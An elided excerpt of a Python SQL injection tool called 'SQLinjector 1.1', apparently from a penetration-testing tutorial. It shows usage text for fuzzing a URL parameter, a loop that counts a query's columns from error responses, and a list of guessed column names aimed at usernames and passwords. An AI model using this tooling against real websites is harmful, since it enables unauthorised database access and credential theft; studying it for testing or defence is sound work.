...
def banner():
    print('\n***********************************')
    print('* SQLinjector 1.1 *')
    print('***********************************')

def usage():
    print('Usage:')
    print('     -w: url (http://www.somesite.com/new.php?id=FUZZ)\n')
    print('     -i: injection strings file \n')
    print('example: sqlinjector.py -w http://wwww.somesite.com/news.php?id=FUZZ \n')
...
def detect_columns(url):
    ...
    while y < 20:
        ...
        if req.content.find(b'Unknown') == -1:
            y += 1
        else:
            break
    return str(y-1)
...
def detect_columns_names(url):
    column_names = ['username','user','pass','passwd','id','role','surname','address'] #this should be a long file containing potential column names
